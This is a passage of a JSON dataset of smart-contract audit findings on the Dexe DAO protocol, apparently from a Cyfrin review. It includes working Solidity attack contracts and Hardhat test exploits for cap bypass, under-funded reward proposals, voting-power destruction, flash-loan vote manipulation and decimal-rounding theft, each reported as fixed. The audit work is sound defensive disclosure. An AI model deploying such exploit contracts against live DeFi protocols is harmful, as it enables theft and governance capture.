      it(\"attacker can bypass token sale maxAllocationPerUser to buy out the entire tier\", async () => {\n            await purchaseToken1.approve(tsp.address, wei(1000));\n\n            // tier8 has the following parameters:\n            // totalTokenProvided   : wei(1000)\n            // minAllocationPerUser : wei(10)\n            // maxAllocationPerUser : wei(100)\n            // exchangeRate         : 4 sale tokens for every 1 purchaseToken\n            //\n            // one user should at most be able to buy wei(100),\n            // or 10% of the total tier.\n            //\n            // any user can bypass this limit by doing multiple\n            // smaller buys to buy the entire tier.\n            //\n            // start: user has bought no tokens\n            let TIER8 = 8;\n            let purchaseView = userViewsToObjects(await tsp.getUserViews(OWNER, [TIER8]))[0].purchaseView;\n            assert.equal(purchaseView.claimTotalAmount, wei(0));\n\n            // if the user tries to buy it all in one txn,\n            // maxAllocationPerUser is enforced and the txn reverts\n            await truffleAssert.reverts(tsp.buy(TIER8, purchaseToken1.address, wei(250)), \"TSP: wrong allocation\");\n\n            // but user can do multiple smaller buys to get around the\n            // maxAllocationPerUser check which only checks each\n            // txn individually, doesn't factor in the total amount\n            // user has already bought\n            await tsp.buy(TIER8, purchaseToken1.address, wei(25));\n            await tsp.buy(TIER8, purchaseToken1.address, wei(25));\n            await tsp.buy(TIER8, purchaseToken1.address, wei(25));\n            await tsp.buy(TIER8, purchaseToken1.address, wei(25));\n            await tsp.buy(TIER8, purchaseToken1.address, wei(25));\n            await tsp.buy(TIER8, purchaseToken1.address, wei(25));\n            await tsp.buy(TIER8, purchaseToken1.address, wei(25));\n            await tsp.buy(TIER8, purchaseToken1.address, wei(25));\n            await tsp.buy(TIER8, purchaseToken1.address, wei(25));\n            await tsp.buy(TIER8, purchaseToken1.address, wei(25));\n\n            // end: user has bought wei(1000) tokens - the entire tier!\n            purchaseView = userViewsToObjects(await tsp.getUserViews(OWNER, [TIER8]))[0].purchaseView;\n            assert.equal(purchaseView.claimTotalAmount, wei(1000));\n\n            // attempting to buy more fails as the entire tier\n            // has been bought by the single user\n            await truffleAssert.reverts(\n              tsp.buy(TIER8, purchaseToken1.address, wei(25)),\n              \"TSP: insufficient sale token amount\"\n            );\n          });\n```\n\nTo run the PoC: `npx hardhat test --grep \"bypass token sale maxAllocationPerUser\"`\n\n**Recommended Mitigation:** `libs/gov/token-sale-proposal/TokenSaleProposalBuy.sol` [L115-120](https://github.com/dexe-network/DeXe-Protocol/tree/f2fe12eeac0c4c63ac39670912640dc91d94bda5/contracts/libs/gov/token-sale-proposal/TokenSaleProposalBuy.sol#L115-L120) should add the total amount already purchased by the user in the current tier to the current amount being purchased in the same tier, and ensure this total is `<= maxAllocationPerUser`.\n\n**Dexe:**\nFixed in [PR164](https://github.com/dexe-network/DeXe-Protocol/commit/cdf9369193e1b2d6640c975d2c8e872710f6e065#diff-4cd963fe9cc6a9ca86a4c9a2dc8577b8c35f60690c9b9cbffca7a2b551dec99e).  We also changed how `exchageRate` works. So it was \"how many sale tokens per purchase token\", now it is \"how many purchase tokens per sale token\".\n\n**Cyfrin:** Verified; changed our PoC exchange rate to 1:1.",
      "summary": "\nThis bug report describes an issue with the token sale `maxAllocationPerUser` restriction, which is not working as intended and can be bypassed by anyone. This allows an attacker to buy out the entire tier by doing multiple small buys under this limit, thus preventing the tokens from being distributed as intended and having monopoly control of the market. A proof of concept (PoC) was provided and the recommended mitigation was to add the total amount already purchased by the user in the current tier to the current amount being purchased in the same tier, and ensure this total is `<= maxAllocationPerUser`. The bug was fixed in a pull request (PR164) and the PoC exchange rate was changed to 1:1.",
      "quality_score": 4,
      "rarity_score": 4,
      "report_date": {},
      "firm_name": "Cyfrin",
      "protocol_name": "Dexe",
      "source_link": "https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2023-11-10-cyfrin-dexe.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Dacian",
        "0kage"
      ]
    },
    {
      "id": "27296",
      "title": "Under-funded eth distribution proposals can be created causing claiming rewards to revert",
      "impact": "HIGH",
      "content": "**Description:** It is possible to create under-funded eth distribution proposals as `DistributionProposal::execute()` [L62-63](https://github.com/dexe-network/DeXe-Protocol/tree/f2fe12eeac0c4c63ac39670912640dc91d94bda5/contracts/gov/proposals/DistributionProposal.sol#L62-L63) doesn't check whether `amount == msg.value`. If `msg.value < amount` an under-funded distribution proposal will be executed.\n\nThis opens up an attack vector where a malicious GovPool owner can provide fake incentives to users to make them vote on proposals. At the time of reward distribution, owner can simply execute a distribution proposal without sending the promised amount as reward. As a result, users end up voting for a proposal and not getting paid for it.\n\n\n**Impact:** Users can't claim their rewards as `DistributionProposal::claim()` will revert for under-funded distribution proposals. Since anybody can create a `GovPool`, there is a potential for loss to users due to malicious intent.\n\n**Proof of Concept:** Add this PoC to `test/gov/proposals/DistributionProposal.test.js` under the section `describe(\"claim()\", () => {`:\n```javascript\n      it(\"under-funded eth distribution proposals prevents claiming rewards\", async () => {\n        // use GovPool to create a proposal with 10 wei reward\n        await govPool.createProposal(\n          \"example.com\",\n          [[dp.address, wei(\"10\"), getBytesDistributionProposal(1, ETHER_ADDR, wei(\"10\"))]],\n          [],\n          { from: SECOND }\n        );\n\n        // Under-fund the proposal by calling DistributionProposal::execute() with:\n        // 1) token     = ether\n        // 2) amount    = X\n        // 3) msg.value = Y, where Y < X\n        //\n        // This creates an under-funded proposal breaking the subsequent claim()\n        await impersonate(govPool.address);\n        await dp.execute(1, ETHER_ADDR, wei(\"10\"), { value: wei(1), from: govPool.address });\n\n        // only 1 vote so SECOND should get the entire 10 wei reward\n        await govPool.vote(1, true, 0, [1], { from: SECOND });\n\n        // attempting to claim the reward fails as the proposal is under-funded\n        await truffleAssert.reverts(dp.claim(SECOND, [1]), \"Gov: failed to send eth\");\n      });\n```\n\nRun with `npx hardhat test --grep \"under-funded eth distribution\"`\n\n**Recommended Mitigation:** `DistributionProposal::execute()` [L62-63](https://github.com/dexe-network/DeXe-Protocol/tree/f2fe12eeac0c4c63ac39670912640dc91d94bda5/contracts/gov/proposals/DistributionProposal.sol#L62-L63) should revert if `amount != msg.value` for eth funded proposals.\n\n**Dexe:**\nFixed in [PR164](https://github.com/dexe-network/DeXe-Protocol/commit/cdf9369193e1b2d6640c975d2c8e872710f6e065#diff-9559fcfcd35b0e7d69c24765fb0d5996a7b0b87781860c7f821867c26109814f).\n\n**Cyfrin:** Verified.",
      "summary": "\nThis bug report is related to the DeXe Protocol, a decentralized exchange protocol. It was found that it was possible to create under-funded eth distribution proposals as the `DistributionProposal::execute()` function did not check whether the amount of ether sent was equal to the amount of ether specified in the proposal. This opens up an attack vector where a malicious GovPool owner can provide fake incentives to users to make them vote on proposals. At the time of reward distribution, the owner can simply execute a distribution proposal without sending the promised amount as reward. As a result, users end up voting for a proposal and not getting paid for it.\n\nThe impact of this bug is that users can't claim their rewards as `DistributionProposal::claim()` will revert for under-funded distribution proposals. Since anybody can create a `GovPool`, there is potential for users to suffer a loss due to malicious intent.\n\nA proof of concept was provided to demonstrate how this bug could be exploited. A recommended mitigation was also provided, which was to make `DistributionProposal::execute()` revert if the amount of ether sent was not equal to the amount of ether specified in the proposal.\n\nThe bug was fixed in PR164 and verified.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Cyfrin",
      "protocol_name": "Dexe",
      "source_link": "https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2023-11-10-cyfrin-dexe.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Dacian",
        "0kage"
      ]
    },
    {
      "id": "27295",
      "title": "Attacker can destroy user voting power by setting `ERC721Power::totalPower` and all existing NFTs `currentPower` to 0",
      "impact": "HIGH",
      "content": "**Description:** Attacker can destroy user voting power by setting `ERC721Power::totalPower` & all existing nfts' `currentPower` to 0 via a permission-less attack contract by exploiting a discrepancy (\"<\" vs \"<=\") in `ERC721Power` [L144](https://github.com/dexe-network/DeXe-Protocol/tree/f2fe12eeac0c4c63ac39670912640dc91d94bda5/contracts/gov/ERC721/ERC721Power.sol#L144) & [L172](https://github.com/dexe-network/DeXe-Protocol/tree/f2fe12eeac0c4c63ac39670912640dc91d94bda5/contracts/gov/ERC721/ERC721Power.sol#L172):\n\n```solidity\nfunction recalculateNftPower(uint256 tokenId) public override returns (uint256 newPower) {\n    // @audit execution allowed to continue when\n    // block.timestamp == powerCalcStartTimestamp\n    if (block.timestamp < powerCalcStartTimestamp) {\n        return 0;\n    }\n    // @audit getNftPower() returns 0 when\n    // block.timestamp == powerCalcStartTimestamp\n    newPower = getNftPower(tokenId);\n\n    NftInfo storage nftInfo = nftInfos[tokenId];\n\n    // @audit as this is the first update since power\n    // calculation has just started, totalPower will be\n    // subtracted by nft's max power\n    totalPower -= nftInfo.lastUpdate != 0 ? nftInfo.currentPower : getMaxPowerForNft(tokenId);\n    // @audit totalPower += 0 (newPower = 0 in above line)\n    totalPower += newPower;\n\n    nftInfo.lastUpdate = uint64(block.timestamp);\n    // @audit will set nft's current power to 0\n    nftInfo.currentPower = newPower;\n}\n\nfunction getNftPower(uint256 tokenId) public view override returns (uint256) {\n    // @audit execution always returns 0 when\n    // block.timestamp == powerCalcStartTimestamp\n    if (block.timestamp <= powerCalcStartTimestamp) {\n        return 0;\n```\nThis attack has to be run on the exact block that power calculation starts (when `block.timestamp == ERC721Power.powerCalcStartTimestamp`).\n\n**Impact:** `ERC721Power::totalPower` & all existing nft's `currentPower` are set 0, negating voting using `ERC721Power` since [`totalPower` is read when creating the snapshot](https://github.com/dexe-network/DeXe-Protocol/tree/f2fe12eeac0c4c63ac39670912640dc91d94bda5/contracts/gov/user-keeper/GovUserKeeper.sol#L330-L331) and [`GovUserKeeper::getNftsPowerInTokensBySnapshot()` will return 0](https://github.com/dexe-network/DeXe-Protocol/tree/f2fe12eeac0c4c63ac39670912640dc91d94bda5/contracts/gov/user-keeper/GovUserKeeper.sol#L546-L548) same as if the nft contract didn't exist. Can also negatively affect the ability to [create proposals](https://github.com/dexe-network/DeXe-Protocol/tree/f2fe12eeac0c4c63ac39670912640dc91d94bda5/contracts/gov/user-keeper/GovUserKeeper.sol#L604-L606).\n\nThis attack is extremely devastating as the individual power of `ERC721Power` nfts can never be increased; it can only decrease over time if the required collateral is not deposited. By setting all nfts' `currentPower = 0` as soon as power calculation starts (`block.timestamp == ERC721Power.powerCalcStartTimestamp`) the `ERC721Power` contract is effectively completely bricked - there is no way to \"undo\" this attack unless the nft contract is replaced with a new contract.\n\nDexe-DAO can be created [using only nfts for voting](https://github.com/dexe-network/DeXe-Protocol/tree/f2fe12eeac0c4c63ac39670912640dc91d94bda5/contracts/gov/user-keeper/GovUserKeeper.sol#L74); in this case this exploit which completely bricks the voting power of all nfts means a new DAO has to be re-deployed since no one can vote as everyone's voting power has been destroyed.\n\n**Proof of Concept:** Add attack contract `mock/utils/ERC721PowerAttack.sol`:\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.4;\n\nimport \"../../gov/ERC721/ERC721Power.sol\";\n\nimport \"hardhat/console.sol\";\n\ncontract ERC721PowerAttack {\n    // this attack can decrease ERC721Power::totalPower by the true max power of all\n    // the power nfts that exist (to zero), regardless of who owns them, and sets the current\n    // power of all nfts to zero, totally bricking the ERC721Power contract.\n    //\n    // this attack only works when block.timestamp == nftPower.powerCalcStartTimestamp\n    // as it takes advantage of a difference in getNftPower() & recalculateNftPower():\n    //\n    // getNftPower() returns 0 when block.timestamp <= powerCalcStartTimestamp\n    // recalculateNftPower returns 0 when block.timestamp < powerCalcStartTimestamp\n    function attack(\n        address nftPowerAddr,\n        uint256 initialTotalPower,\n        uint256 lastTokenId\n    ) external {\n        ERC721Power nftPower = ERC721Power(nftPowerAddr);\n\n        // verify attack starts on the correct block\n        require(\n            block.timestamp == nftPower.powerCalcStartTimestamp(),\n            \"ERC721PowerAttack: attack requires block.timestamp == nftPower.powerCalcStartTimestamp\"\n        );\n\n        // verify totalPower() correct at starting block\n        require(\n            nftPower.totalPower() == initialTotalPower,\n            \"ERC721PowerAttack: incorrect initial totalPower\"\n        );\n\n        // call recalculateNftPower() for every nft, this:\n        // 1) decreases ERC721Power::totalPower by that nft's max power\n        // 2) sets that nft's currentPower = 0\n        for (uint256 i = 1; i <= lastTokenId; ) {\n            require(\n                nftPower.recalculateNftPower(i) == 0,\n                \"ERC721PowerAttack: recalculateNftPower() should return 0 for new nft power\"\n            );\n\n            unchecked {\n                ++i;\n            }\n        }\n\n        require(\n            nftPower.totalPower() == 0,\n            \"ERC721PowerAttack: after attack finished totalPower should equal 0\"\n        );\n    }\n}\n```\n\nAdd test harness to `ERC721Power.test.js`:\n```javascript\n    describe(\"audit attacker can manipulate ERC721Power totalPower\", () => {\n      it(\"audit attack 1 sets ERC721Power totalPower & all nft currentPower to 0\", async () => {\n        // deploy the ERC721Power nft contract with:\n        // max power of each nft = 100\n        // power reduction 10%\n        // required collateral = 100\n        let maxPowerPerNft = toPercent(\"100\");\n        let requiredCollateral = wei(\"100\");\n        let powerCalcStartTime = (await getCurrentBlockTime()) + 1000;\n        // hack needed to start attack contract on exact block due to hardhat\n        // advancing block.timestamp in the background between function calls\n        let powerCalcStartTime2 = (await getCurrentBlockTime()) + 999;\n\n        // create power nft contract\n        await deployNft(powerCalcStartTime, maxPowerPerNft, toPercent(\"10\"), requiredCollateral);\n\n        // ERC721Power::totalPower should be zero as no nfts yet created\n        assert.equal((await nft.totalPower()).toFixed(), toPercent(\"0\").times(1).toFixed());\n\n        // create the attack contract\n        const ERC721PowerAttack = artifacts.require(\"ERC721PowerAttack\");\n        let attackContract = await ERC721PowerAttack.new();\n\n        // create 10 power nfts for SECOND\n        await nft.safeMint(SECOND, 1);\n        await nft.safeMint(SECOND, 2);\n        await nft.safeMint(SECOND, 3);\n        await nft.safeMint(SECOND, 4);\n        await nft.safeMint(SECOND, 5);\n        await nft.safeMint(SECOND, 6);\n        await nft.safeMint(SECOND, 7);\n        await nft.safeMint(SECOND, 8);\n        await nft.safeMint(SECOND, 9);\n        await nft.safeMint(SECOND, 10);\n\n        // verify ERC721Power::totalPower has been increased by max power for all nfts\n        assert.equal((await nft.totalPower()).toFixed(), maxPowerPerNft.times(10).toFixed());\n\n        // fast forward time to the start of power calculation\n        await setTime(powerCalcStartTime2);\n\n        // launch the attack\n        await attackContract.attack(nft.address, maxPowerPerNft.times(10).toFixed(), 10);\n      });\n    });\n```\n\nRun attack with: `npx hardhat test --grep \"audit attack 1 sets ERC721Power totalPower & all nft currentPower to 0\"`\n\n**Recommended Mitigation:** Resolve the discrepancy between `ERC721Power` [L144](https://github.com/dexe-network/DeXe-Protocol/tree/f2fe12eeac0c4c63ac39670912640dc91d94bda5/contracts/gov/ERC721/ERC721Power.sol#L144) & [L172](https://github.com/dexe-network/DeXe-Protocol/tree/f2fe12eeac0c4c63ac39670912640dc91d94bda5/contracts/gov/ERC721/ERC721Power.sol#L172).\n\n**Dexe:**\nFixed in [PR174](https://github.com/dexe-network/DeXe-Protocol/commit/8c52fe4264d7868ab261ee789d0efe9f4edddfc2).\n\n**Cyfrin:** Verified.\n\n\\clearpage",
      "summary": "\nThis bug report is about an attack contract that can be used to exploit a discrepancy in the ERC721Power contract to set the total voting power and the current power of all existing Non-Fungible Tokens (NFTs) to 0. This attack can be run on the exact block that power calculation starts (when `block.timestamp == ERC721Power.powerCalcStartTimestamp`).\n\nThe impact of this attack is that `ERC721Power::totalPower` & all existing nft's `currentPower` are set 0, negating voting using `ERC721Power` since `totalPower` is read when creating the snapshot and `GovUserKeeper::getNftsPowerInTokensBySnapshot()` will return 0 same as if the nft contract didn't exist. It can also negatively affect the ability to create proposals. This attack is extremely devastating as the individual power of `ERC721Power` nfts can never be increased; it can only decrease over time if the required collateral is not deposited.\n\nThe bug was fixed by resolving the discrepancy between `ERC721Power` [L144](https://github.com/dexe-network/DeXe-Protocol/tree/f2fe12eeac0c4c63ac39670912640dc91d94bda5/contracts/gov/ERC721/ERC721Power.sol#L144) & [L172](https://github.com/dexe-network/DeXe-Protocol/tree/f2fe12eeac0c4c63ac39670912640dc91d94bda5/contracts/gov/ERC721/ERC721Power.sol#L172) and was verified.",
      "quality_score": 4,
      "rarity_score": 4,
      "report_date": {},
      "firm_name": "Cyfrin",
      "protocol_name": "Dexe",
      "source_link": "https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2023-11-10-cyfrin-dexe.md",
      "github_link": "",
      "tags": [
        "Vote",
        "NFT",
        "ERC721"
      ],
      "finders": [
        "Dacian",
        "0kage"
      ]
    },
    {
      "id": "27294",
      "title": "Attacker can combine flashloan with delegated voting to decide a proposal and withdraw their tokens while the proposal is still in Locked state",
      "impact": "HIGH",
      "content": "**Description:** Attacker can combine a flashloan with delegated voting to bypass the existing flashloan mitigations, allowing the attacker to decide a proposal & withdraw their tokens while the proposal is still in the Locked state. The entire attack can be performed in 1 transaction via an attack contract.\n\n**Impact:** Attacker can bypass existing flashloan mitigations to decide the outcome of proposals by combining flashloan with delegated voting.\n\n**Proof of Concept:** Add the attack contract to `mock/utils/FlashDelegationVoteAttack.sol`:\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.4;\n\nimport \"../../interfaces/gov/IGovPool.sol\";\n\nimport \"@openzeppelin/contracts/token/ERC20/IERC20.sol\";\n\ncontract FlashDelegationVoteAttack {\n    //\n    // how the attack contract works:\n    //\n    // 1) use flashloan to acquire large amount of voting tokens\n    //    (caller transfer tokens to contract before calling to simplify PoC)\n    // 2) deposit voting tokens into GovPool\n    // 3) delegate voting power to slave contract\n    // 4) slave contract votes with delegated power\n    // 5) proposal immediately reaches quorum and moves into Locked state\n    // 6) undelegate voting power from slave contract\n    //    since undelegation works while Proposal is in locked state\n    // 7) withdraw voting tokens from GovPool while proposal still in Locked state\n    // 8) all in 1 txn\n    //\n\n    function attack(address govPoolAddress, address tokenAddress, uint256 proposalId) external {\n        // verify that the attack contract contains the voting tokens\n        IERC20 votingToken = IERC20(tokenAddress);\n\n        uint256 votingPower = votingToken.balanceOf(address(this));\n        require(votingPower > 0, \"AttackContract: need to send tokens first\");\n\n        // create the slave contract that this contract will delegate to which\n        // will do the actual vote\n        FlashDelegationVoteAttackSlave slave = new FlashDelegationVoteAttackSlave();\n\n        // deposit our tokens with govpool\n        IGovPool govPool = IGovPool(govPoolAddress);\n\n        // approval first\n        (, address userKeeperAddress, , , ) = govPool.getHelperContracts();\n        votingToken.approve(userKeeperAddress, votingPower);\n\n        // then actual deposit\n        govPool.deposit(address(this), votingPower, new uint256[](0));\n\n        // verify attack contract has no tokens\n        require(\n            votingToken.balanceOf(address(this)) == 0,\n            \"AttackContract: balance should be 0 after depositing tokens\"\n        );\n\n        // delegate our voting power to the slave\n        govPool.delegate(address(slave), votingPower, new uint256[](0));\n\n        // slave does the actual vote\n        slave.vote(govPool, proposalId);\n\n        // verify proposal now in Locked state as quorum was reached\n        require(\n            govPool.getProposalState(proposalId) == IGovPool.ProposalState.Locked,\n            \"AttackContract: proposal didnt move to Locked state after vote\"\n        );\n\n        // undelegate our voting power from the slave\n        govPool.undelegate(address(slave), votingPower, new uint256[](0));\n\n        // withdraw our tokens\n        govPool.withdraw(address(this), votingPower, new uint256[](0));\n\n        // verify attack contract has withdrawn all tokens used in the delegated vote\n        require(\n            votingToken.balanceOf(address(this)) == votingPower,\n            \"AttackContract: balance should be full after withdrawing\"\n        );\n\n        // verify proposal still in the Locked state\n        require(\n            govPool.getProposalState(proposalId) == IGovPool.ProposalState.Locked,\n            \"AttackContract: proposal should still be in Locked state after withdrawing tokens\"\n        );\n\n        // attack contract can now repay flash loan\n    }\n}\n\ncontract FlashDelegationVoteAttackSlave {\n    function vote(IGovPool govPool, uint256 proposalId) external {\n        // slave has no voting power so votes 0, this will automatically\n        // use the delegated voting power\n        govPool.vote(proposalId, true, 0, new uint256[](0));\n    }\n}\n```\n\nAdd the unit test to `GovPool.test.js` under `describe(\"getProposalState()\", () => {`:\n```javascript\n      it(\"audit attacker combine flash loan with delegation to decide vote then immediately withdraw loaned tokens by undelegating\", async () => {\n        await changeInternalSettings(false);\n\n        // setup the proposal\n        let proposalId = 2;\n        await govPool.createProposal(\n          \"example.com\",\n          [[govPool.address, 0, getBytesGovVote(proposalId, wei(\"100\"), [], true)]],\n          [[govPool.address, 0, getBytesGovVote(proposalId, wei(\"100\"), [], false)]]\n        );\n\n        assert.equal(await govPool.getProposalState(proposalId), ProposalState.Voting);\n\n        // setup the attack contract\n        const AttackContractMock = artifacts.require(\"FlashDelegationVoteAttack\");\n        let attackContract = await AttackContractMock.new();\n\n        // give SECOND's tokens to the attack contract\n        let voteAmt = wei(\"100000000000000000000\");\n        await govPool.withdraw(attackContract.address, voteAmt, [], { from: SECOND });\n\n        // execute the attack\n        await attackContract.attack(govPool.address, token.address, proposalId);\n      });\n```\n\nRun the test with: `npx hardhat test --grep \"audit attacker combine flash loan with delegation\"`.\n\n**Recommended Mitigation:** Consider additional defensive measures such as not allowing delegation/undelegation & deposit/withdrawal in the same block.\n\n**Dexe:**\nFixed in [PR166](https://github.com/dexe-network/DeXe-Protocol/commit/30b56c87c6c4902ec5a4c470d8a2812cd43dc53c).\n\n**Cyfrin:** Verified.",
      "summary": "\nA bug report has been filed which highlights an attack vector that allows attackers to bypass existing flashloan mitigations. This is achieved by combining flashloan with delegated voting, allowing the attacker to decide the outcome of proposals while the proposal is still in the Locked state. The attack can be performed in one transaction via an attack contract. \n\nThe impact of this attack is that the attacker can bypass existing flashloan mitigations. A proof of concept was provided which adds an attack contract to `mock/utils/FlashDelegationVoteAttack.sol` and a unit test to `GovPool.test.js` under `describe(\"getProposalState()\", () => {`. The test can be run with `npx hardhat test --grep \"audit attacker combine flash loan with delegation\"`.\n\nThe recommended mitigation for this attack is to consider additional defensive measures such as not allowing delegation/undelegation & deposit/withdrawal in the same block. The bug has been fixed in PR166 and verified by Cyfrin.",
      "quality_score": 3,
      "rarity_score": 5,
      "report_date": {},
      "firm_name": "Cyfrin",
      "protocol_name": "Dexe",
      "source_link": "https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2023-11-10-cyfrin-dexe.md",
      "github_link": "",
      "tags": [
        "Vote",
        "Flash Loan",
        "Delegate"
      ],
      "finders": [
        "Dacian",
        "0kage"
      ]
    },
    {
      "id": "27293",
      "title": "`TokenSaleProposal::buy` implicitly assumes that buy token has 18 decimals resulting in a potential total loss scenario for Dao Pool",
      "impact": "HIGH",
      "content": "**Description:** `TokenSaleProposalBuy::buy` is called by users looking to buy the DAO token using a pre-approved token. The exchange rate for this sale is pre-assigned for the specific tier. This function internally calls `TokenSaleProposalBuy::_purchaseWithCommission` to transfer funds from the buyer to the gov pool. Part of the transferred funds are used to pay the DexeDAO commission and balance funds are transferred to the `GovPool` address. To do this, `TokenSaleProposalBuy::_sendFunds` is called.\n\n```solidity\n    function _sendFunds(address token, address to, uint256 amount) internal {\n        if (token == ETHEREUM_ADDRESS) {\n            (bool success, ) = to.call{value: amount}(\"\");\n            require(success, \"TSP: failed to transfer ether\");\n        } else {\n  >>          IERC20(token).safeTransferFrom(msg.sender, to, amount.from18(token.decimals())); //@audit -> amount is assumed to be 18 decimals\n        }\n    }\n```\n\nNote that this function assumes that the `amount` of ERC20 token is always 18 decimals. The `DecimalsConverter::from18` function converts from a base decimal (18) to token decimals. Note that the amount is directly passed by the buyer and there is no prior normalisation done to ensure the token decimals are converted to 18 decimals before the `_sendFunds` is called.\n\n\n**Impact:** It is easy to see that for tokens with smaller decimals, eg. USDC with 6 decimals, will cause a total loss to the DAO. In such cases amount is presumed to be 18 decimals & on converting to token decimals(6), this number can round down to 0.\n\n**Proof of Concept:**\n- Tier 1 allows users to buy DAO token at exchange rate, 1 DAO token = 1 USDC.\n-  User intends to buy 1000 Dao Tokens and calls `TokenSaleProposal::buy` with `buy(1, USDC, 1000*10**6)\n- Dexe DAO Comission is assumed 0% for simplicity- > `sendFunds` is called with `sendFunds(USDC, govPool, 1000* 10**6)`\n- `DecimalConverter::from18` function is called on amount with base decimals 18, destination decimals 6:  `from18(1000*10**6, 18, 6)`\n- this gives `1000*10**6/10*(18-6) = 1000/ 10**6` which rounds to 0\n\nBuyer can claim 1000 DAO tokens for free. This is a total loss to the DAO.\n\nAdd PoC to `TokenSaleProposal.test.js`:\n\nFirst add a new line around [L76](https://github.com/dexe-network/DeXe-Protocol/tree/f2fe12eeac0c4c63ac39670912640dc91d94bda5/test/gov/proposals/TokenSaleProposal.test.js#L76) to add new `purchaseToken3`:\n```javascript\n      let purchaseToken3;\n```\n\nThen add a new line around [L528](https://github.com/dexe-network/DeXe-Protocol/tree/f2fe12eeac0c4c63ac39670912640dc91d94bda5/test/gov/proposals/TokenSaleProposal.test.js#L528):\n```javascript\n      purchaseToken3 = await ERC20Mock.new(\"PurchaseMockedToken3\", \"PMT3\", 6);\n```\n\nThen add a new tier around [L712](https://github.com/dexe-network/DeXe-Protocol/tree/f2fe12eeac0c4c63ac39670912640dc91d94bda5/test/gov/proposals/TokenSaleProposal.test.js#L712):\n```javascript\n        {\n          metadata: {\n            name: \"tier 9\",\n            description: \"the ninth tier\",\n          },\n          totalTokenProvided: wei(1000),\n          saleStartTime: timeNow.toString(),\n          saleEndTime: (timeNow + 10000).toString(),\n          claimLockDuration: \"0\",\n          saleTokenAddress: saleToken.address,\n          purchaseTokenAddresses: [purchaseToken3.address],\n          exchangeRates: [PRECISION.times(1).toFixed()],\n          minAllocationPerUser: 0,\n          maxAllocationPerUser: 0,\n          vestingSettings: {\n            vestingPercentage: \"0\",\n            vestingDuration: \"0\",\n            cliffPeriod: \"0\",\n            unlockStep: \"0\",\n          },\n          participationDetails: [],\n        },\n```\n\nThen add the test itself under the section `describe(\"if added to whitelist\", () => {`:\n```javascript\n          it(\"audit buy implicitly assumes that buy token has 18 decimals resulting in loss to DAO\", async () => {\n            await purchaseToken3.approve(tsp.address, wei(1000));\n\n            // tier9 has the following parameters:\n            // totalTokenProvided   : wei(1000)\n            // minAllocationPerUser : 0 (no min)\n            // maxAllocationPerUser : 0 (no max)\n            // exchangeRate         : 1 sale token for every 1 purchaseToken\n            //\n            // purchaseToken3 has 6 decimal places\n            //\n            // mint purchase tokens to owner 1000 in 6 decimal places\n            //                        1000 000000\n            let buyerInitTokens6Dec = 1000000000;\n\n            await purchaseToken3.mint(OWNER, buyerInitTokens6Dec);\n            await purchaseToken3.approve(tsp.address, buyerInitTokens6Dec, { from: OWNER });\n\n            //\n            // start: buyer has bought no tokens\n            let TIER9 = 9;\n            let purchaseView = userViewsToObjects(await tsp.getUserViews(OWNER, [TIER9]))[0].purchaseView;\n            assert.equal(purchaseView.claimTotalAmount, wei(0));\n\n            // buyer attempts to purchase using 100 purchaseToken3 tokens\n            // purchaseToken3 has 6 decimals but all inputs to Dexe should be in\n            // 18 decimals, so buyer formats input amount to 18 decimals\n            // doing this first to verify it works correctly\n            let buyInput18Dec = wei(\"100\");\n            await tsp.buy(TIER9, purchaseToken3.address, buyInput18Dec);\n\n            // buyer has bought wei(100) sale tokens\n            purchaseView = userViewsToObjects(await tsp.getUserViews(OWNER, [TIER9]))[0].purchaseView;\n            assert.equal(purchaseView.claimTotalAmount, buyInput18Dec);\n\n            // buyer has 900 000000 remaining purchaseToken3 tokens\n            assert.equal((await purchaseToken3.balanceOf(OWNER)).toFixed(), \"900000000\");\n\n            // next buyer attempts to purchase using 100 purchaseToken3 tokens\n            // but sends input formatted into native 6 decimals\n            // sends 6 decimal input: 100 000000\n            let buyInput6Dec = 100000000;\n            await tsp.buy(TIER9, purchaseToken3.address, buyInput6Dec);\n\n            // buyer has bought an additional 100000000 sale tokens\n            purchaseView = userViewsToObjects(await tsp.getUserViews(OWNER, [TIER9]))[0].purchaseView;\n            assert.equal(purchaseView.claimTotalAmount, \"100000000000100000000\");\n\n            // but the buyer still has 900 000000 remaining purchasetoken3 tokens\n            assert.equal((await purchaseToken3.balanceOf(OWNER)).toFixed(), \"900000000\");\n\n            // by sending the input amount formatted to 6 decimal places,\n            // the buyer was able to buy small amounts of the token being sold\n            // for free!\n          });\n```\n\nFinally run the test with: `npx hardhat test --grep \"audit buy implicitly assumes that buy token has 18 decimals resulting in loss to DAO\"`\n\n**Recommended Mitigation:** There are at least 2 options for mitigating this issue:\n\nOption 1 - revise the design decision that all token amounts must be sent in 18 decimals even if the underlying token decimals are not 18, to instead that all token amounts should be sent in their native decimals and Dexe will convert everything.\n\nOption 2 - keep current design but revert if `amount.from18(token.decimals()) == 0` in [L90](https://github.com/dexe-network/DeXe-Protocol/tree/f2fe12eeac0c4c63ac39670912640dc91d94bda5/contracts/libs/gov/token-sale-proposal/TokenSaleProposalBuy.sol#L90) or alternatively use the [`from18Safe()`](https://github.com/dl-solarity/solidity-lib/blob/master/contracts/libs/utils/DecimalsConverter.sol#L124) function which uses [`_convertSafe()`](https://github.com/dl-solarity/solidity-lib/blob/master/contracts/libs/utils/DecimalsConverter.sol#L248) that reverts if the conversion is 0.\n\nThe project team should also examine other areas where the same pattern occurs which may have the same vulnerability and where it may be required to revert if the conversion returns 0:\n\n* `GovUserKeeper` [L92](https://github.com/dexe-network/DeXe-Protocol/tree/f2fe12eeac0c4c63ac39670912640dc91d94bda5/contracts/gov/user-keeper/GovUserKeeper.sol#L92), [L116](https://github.com/dexe-network/DeXe-Protocol/tree/f2fe12eeac0c4c63ac39670912640dc91d94bda5/contracts/gov/user-keeper/GovUserKeeper.sol#L116), [L183](https://github.com/dexe-network/DeXe-Protocol/tree/f2fe12eeac0c4c63ac39670912640dc91d94bda5/contracts/gov/user-keeper/GovUserKeeper.sol#L183)\n* `GovPool` [L248](https://github.com/dexe-network/DeXe-Protocol/tree/f2fe12eeac0c4c63ac39670912640dc91d94bda5/contracts/gov/GovPool.sol#L248)\n* 